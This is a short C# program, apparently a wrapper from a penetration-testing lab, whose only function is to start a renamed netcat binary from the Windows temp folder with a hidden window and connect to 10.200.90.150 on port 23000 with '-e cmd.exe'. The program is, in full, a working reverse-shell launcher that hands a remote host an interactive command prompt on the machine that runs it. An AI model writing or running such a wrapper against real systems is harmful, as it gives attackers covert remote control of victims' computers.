using System;
using System.Diagnostics;

namespace Wrapper {
        class Program {
                static void Main() {
                        Process proc = new Process();
                        ProcessStartInfo ProcInfo = new ProcessStartInfo("C:\\Windows\\temp\\nc-BBB.exe", " 10.200.90.150 23000 -e cmd.exe");
                        ProcInfo.CreateNoWindow = true;
                        proc.StartInfo = ProcInfo;
                        proc.Start();
                }
        }
}
